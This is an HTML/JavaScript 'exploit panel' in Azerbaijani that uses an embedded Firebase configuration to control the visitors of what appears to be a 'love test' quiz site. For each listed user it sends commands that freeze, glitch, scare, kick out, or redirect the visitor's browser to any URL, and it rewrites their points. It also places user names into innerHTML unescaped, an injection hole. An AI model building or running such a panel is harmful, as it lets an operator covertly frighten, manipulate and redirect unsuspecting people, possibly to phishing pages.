<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <title>WW24 | God Mode</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        :root { --red: #ff3e3e; --cyan: #00f2ff; --purple: #a855f7; --green: #25d366; }
        body { background: #05070a; color: white; font-family: 'Consolas', monospace; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        .user-card { background: rgba(255,255,255,0.05); border: 1px solid #222; border-radius: 12px; padding: 15px; border-top: 3px solid var(--cyan); }
        
        .action-group { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 10px; }
        button { border: none; padding: 8px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 0.7rem; opacity: 0.9; }
        button:hover { opacity: 1; transform: scale(1.02); }
        
        .btn-blue { background: var(--cyan); color: #000; }
        .btn-red { background: var(--red); color: #fff; }
        .btn-purple { background: var(--purple); color: #fff; }
        .btn-green { background: var(--green); color: #000; }
        
        input, select { background: #000; border: 1px solid #333; color: #00f2ff; padding: 8px; border-radius: 5px; width: 100%; box-sizing: border-box; margin-bottom: 5px; }
        .badge { background: #111; padding: 4px 8px; border-radius: 4px; font-size: 0.7rem; color: var(--cyan); }
    </style>
</head>
<body>

    <h1 style="color: var(--cyan); border-bottom: 1px solid #222; padding-bottom: 10px;">
        <i class="fas fa-skull-crossbones"></i> WW24 EXPLOIT PANEL <span id="user-count" class="badge">0</span>
    </h1>

    <div class="grid" id="admin-grid"></div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", 
            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com", 
            projectId: "sevgili-testi" 
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function renderUsers() {
            db.ref('users').on('value', (snap) => {
                const grid = document.getElementById('admin-grid');
                grid.innerHTML = "";
                let count = 0;
                snap.forEach((child) => {
                    count++;
                    const name = child.key;
                    const user = child.val();
                    const card = document.createElement('div');
                    card.className = "user-card";
                    card.innerHTML = `
                        <div style="display:flex; justify-content:space-between;">
                            <b><i class="fas fa-terminal"></i> ${name.toUpperCase()}</b>
                            <span class="badge">${user.points || 0} PTS</span>
                        </div>
                        
                        <div style="margin-top:10px;">
                            <input type="text" id="msg-${name}" placeholder="Ekran mesajı...">
                            <button class="btn-blue" style="width:100%" onclick="sendCmd('${name}', 'alert')">BİLDİRİŞ GÖNDƏR</button>
                        </div>

                        <div class="action-group">
                            <button class="btn-red" onclick="sendCmd('${name}', 'freeze')">DONDUR</button>
                            <button class="btn-blue" onclick="sendCmd('${name}', 'unfreeze')">AÇ</button>
                            <button class="btn-purple" onclick="sendCmd('${name}', 'glitch')">GLITCH EFFECT</button>
                            <button class="btn-red" onclick="sendCmd('${name}', 'scare')">SCARE JUMP</button>
                            <button class="btn-green" onclick="redirectUser('${name}')">YÖNLƏNDİR</button>
                            <button class="btn-red" onclick="sendCmd('${name}', 'kick')">KICK OUT</button>
                        </div>
                        
                        <input type="number" id="pts-${name}" placeholder="Xal təyin et" style="margin-top:10px;">
                        <button class="btn-green" style="width:100%" onclick="setPts('${name}')">XALI YENİLƏ</button>
                    `;
                    grid.appendChild(card);
                });
                document.getElementById('user-count').innerText = count;
            });
        }

        function sendCmd(name, type) {
            const text = document.getElementById(`msg-${name}`).value;
            db.ref(`commands/${name}`).set({
                type: type,
                text: text || "",
                time: Date.now()
            });
            if(type === 'alert') document.getElementById(`msg-${name}`).value = "";
        }

        function redirectUser(name) {
            const url = prompt("Yönləndiriləcək link (məs: https://google.com):");
            if(url) db.ref(`commands/${name}`).set({ type: 'redirect', url: url, time: Date.now() });
        }

        function setPts(name) {
            const p = document.getElementById(`pts-${name}`).value;
            if(p) db.ref(`users/${name}/points`).set(parseInt(p));
        }

        renderUsers();
    </script>
</body>
</html>
